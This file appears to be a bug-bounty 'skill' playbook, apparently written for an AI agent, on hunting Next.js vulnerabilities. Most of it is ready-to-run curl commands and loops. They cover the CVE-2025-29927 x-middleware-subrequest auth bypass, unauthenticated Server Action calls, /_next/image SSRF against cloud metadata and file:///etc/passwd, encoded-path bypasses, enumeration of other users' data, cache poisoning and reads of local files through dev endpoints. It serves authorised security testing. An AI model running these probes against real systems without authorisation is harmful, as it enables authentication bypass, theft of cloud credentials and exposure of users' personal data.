---
name: hunt-nextjs
description: Hunt Next.js specific vulnerabilities — x-middleware-subrequest auth bypass (CVE-2025-29927), Server Actions arbitrary function execution + SSRF (CVE-2024-34351), Middleware auth bypass via matcher/path gaps, ISR/RSC cache poisoning (CVE-2024-46982), Image Optimization SSRF (/_next/image), RSC flight-data leakage, getServerSideProps injection, source map exposure, debug endpoint leakage. Use when target runs Next.js 11/12/13/14/15 or any React SSR framework.
sources: "cve_database (CVE-2024-34351 / GHSA-fr5h-rqp8-mj6g), Next.js advisories"
report_count: 0
---

# HUNT-NEXTJS — Next.js / SSR Framework Vulnerabilities

## Crown Jewel Targets

Next.js-specific bugs that bypass auth or reach SSRF = High/Critical.

**Highest-value chains:**
- **`x-middleware-subrequest` middleware bypass (CVE-2025-29927)** — a crafted `x-middleware-subrequest` header makes Next.js skip middleware entirely → all middleware-enforced auth/authz bypassed. Affects 11.1.4–15.2.2 (fixed 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5). THE highest-value Next.js bug of 2025 — test it first on any middleware-gated route.
- **Server Actions auth bypass** — Server Actions enforce auth client-side only → call action ID directly → unauthorized data mutation or exfil
- **Middleware bypass via path/matcher gaps** — middleware `matcher` skips static/data paths → protected routes reachable via `/_next/data/` JSON or path-normalization tricks (IDOR)
- **`/_next/image` SSRF** — Image optimizer fetches attacker-controlled URL → internal network scan or cloud metadata
- **ISR stale cache poisoning** — inject malicious content into a cached page that gets served to all users
- **RSC payload leakage** — React Server Component flight data contains server-side props not meant for client (`?__flight__`, `RSC: 1` header, `Next-Router-State-Tree`)

**Decision tree (adapts to any Next.js deployment):**
1. Fingerprint version (Phase 1). Map it to the CVE-2025-29927 window → if in range, the `x-middleware-subrequest` bypass is the first probe.
2. Is there middleware-enforced auth (redirect to `/login` on protected route)? → run Phase 3 bypass matrix + the subrequest header.
3. Are there Server Actions (`Next-Action` IDs in HTML/JS)? → Phase 2.
4. Is `/_next/image` present? → Phase 4 SSRF (allowlist-aware).
5. SSG/ISR pages (`x-nextjs-cache` header)? → Phase 6 cache poisoning + revalidate secret.
Run every branch that fingerprints positive — do not stop at the first.

---

## Attack Surface Signals

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

## Phase 1 — Fingerprint & Version Detection

```bash
# Confirm Next.js and get build ID
curl -s https://$TARGET/ | grep -oP '"buildId":"[^"]+"'
curl -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl -s https://$TARGET/ | grep -oP '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl -s https://$TARGET/_next/static/chunks/framework*.js | grep -oP '"next":"[^"]+"'

# Source map exposure
curl -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

**Version → CVE map (check before hunting):**
| Version range | Key bug | Note |
|---|---|---|
| 11.1.4 – 15.2.2 | **CVE-2025-29927** middleware bypass via `x-middleware-subrequest` | Fixed 15.2.3 / 14.2.25 / 13.5.9 / 12.3.5. Self-hosted (`next start`, standalone) affected; some managed hosts (Vercel/Netlify) patched at the edge — test anyway |
| 13.4.0 – <14.1.1 | CVE-2024-34351 Server Actions SSRF (Host-trusting relative redirect) | Fixed 14.1.1; not `/_next/image` |
| <14.2.21 (App Router cache) | CVE-2024-46982 cache poisoning via crafted RSC request | Poison a static page into the cache |
Treat the map as a starting hypothesis — confirm the actual behavior, never report on version banner alone.

---

## Phase 2 — Server Actions Abuse

```bash
# Server Actions in Next.js 14+ use x-action-id or Next-Action header
# Find action IDs in HTML source or JS bundles
curl -s https://$TARGET/ | grep -oP '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# Test: does the action execute without a valid session?
# If it returns data or mutates state → auth enforcement is client-side only
```

---

## Phase 3 — Middleware Auth Bypass

```bash
# === CVE-2025-29927: x-middleware-subrequest bypass (test this FIRST) ===
# The header value is a ":"-joined middleware path. Next tolerates repeats, so a
# long repeated value covers nested/renamed middleware. Try all known shapes:
BASE=$(curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard)   # baseline (302/401/403 expected)
for V in \
  "middleware" \
  "src/middleware" \
  "middleware:middleware:middleware:middleware:middleware" \
  "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware" \
  "pages/_middleware"; do
  CODE=$(curl -s -o /tmp/mw -w "%{http_code}" https://$TARGET/admin/dashboard -H "x-middleware-subrequest: $V")
  echo "[$CODE] x-middleware-subrequest: $V"
done
# A protected route flipping from 302/401/403 (baseline) to 200 WITH authed content
# = confirmed auth bypass. Body-diff /tmp/mw vs a known-unauth response to prove it.

# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

## Phase 4 — Image Optimization SSRF (`/_next/image`)

```bash
# Basic SSRF test — internal metadata
curl -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**FALSE-POSITIVE GUARD (read before claiming SSRF):** `/_next/image` only
fetches URLs allowed by `images.remotePatterns` / `images.domains` in
`next.config.js`. A non-whitelisted `url` returns **400 by default** — that is
the optimizer's normal allowlist rejection, NOT a "block" you bypassed. A **200**
returns an *optimized image*, not the upstream response body, so a status code
alone NEVER confirms SSRF. Confirm only via an **out-of-band callback to a unique
Collaborator subdomain** (above), or by body-diffing a known-internal vs
known-external target. Do not report on status code.

> Note: CVE-2024-34351 (Next.js SSRF, GHSA-fr5h-rqp8-mj6g, affects 13.4.0
> through < 14.1.1, fixed in 14.1.1) is a **Server Actions** SSRF — a relative
> redirect that trusts the `Host` header — NOT a `/_next/image` bug, and it does
> NOT affect Host-routed providers like Vercel. See Phase 2 for the Server
> Actions surface.

---

## Phase 5 — `/_next/data/` IDOR & Data Leakage

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

## Phase 6 — ISR Cache Poisoning

```bash
# ISR pages regenerate on request after revalidation period
# If user input influences the static page content without sanitization:
# 1. Trigger revalidation with malicious input in URL/query
# 2. Injected content cached and served to all users

# Test: does query param affect cached page content?
# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"
# 1) Poison with the marker
curl -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

## Phase 7 — Debug & Stack Frame Endpoints

**Precondition:** `__nextjs_launch-editor` and `__nextjs_original-stack-frame`
are react-dev-overlay middleware mounted ONLY under `next dev`. A production
build (`next build && next start`) does not register these routes — a 404 here
is the normal, expected result, not a "filter" you need to bypass. They are
reachable ONLY in the rare misconfiguration of literally running `next dev` in
production. Treat any non-404 as the real finding; do NOT report a 404/filtered
response as confirmation.

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

## Phase 8 — Environment Variable Leakage

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## Chain Table

| Next.js finding | Chain to | Impact |
|----------------|----------|--------|
| `x-middleware-subrequest` bypass (CVE-2025-29927) | Reach every middleware-gated route unauth → admin panels, internal APIs, auth gates | Critical auth bypass |
| Server Action no auth | Call privileged mutations directly | Data manipulation / admin access |
| `/_next/image` SSRF | Cloud metadata → IAM creds | Cloud compromise |
| `/_next/data/` IDOR | Other users' server-side props | PII / token exfil |
| Middleware bypass | Protected admin routes | Auth bypass |
| Source map exposed | Reconstruct TS source → find hardcoded secrets | Further vulns |
| `__NEXT_DATA__` leaks | Server-side secrets in HTML | API keys / tokens |

---

## Validation

✅ Middleware subrequest bypass: protected route returns 200 WITH authenticated/admin content (body-diffed vs unauth baseline) only when the header is present — status code alone is not enough
✅ Server Action: action executes without valid session, returns data or mutates state
✅ SSRF: DNS/HTTP callback received from `/_next/image` SSRF (OOB, unique subdomain)
✅ Middleware bypass: 200 response on protected route without auth cookie, serving data the gate should block
✅ Data leak: `__NEXT_DATA__`/RSC flight data contains non-public secrets or other users' PII

**Severity:**
- `x-middleware-subrequest` bypass reaching admin/internal: Critical
- Server Action auth bypass → data mutation: High/Critical
- Image SSRF → cloud metadata: Critical
- Middleware bypass → admin panel: High
- Source map exposure only: Low-Medium

## Before you report — dedup gate

Fresh/changed surface first (see `dedup-novelty`, `changed-js-deepdive`), and hunt classes in yield
order (`/yield`). Before drafting ANY finding from this skill, run the dedup gate:

```bash
python3 engine/dedup.py check --program <program> --class <class> --url "<endpoint>" --title "<title>"
```

`NOVEL` -> proceed to `/validate`. `LIKELY_DUP` -> stop unless you can prove a concrete differentiator
(different endpoint/param/impact, or a bypass of the deployed fix -> report as a regression).
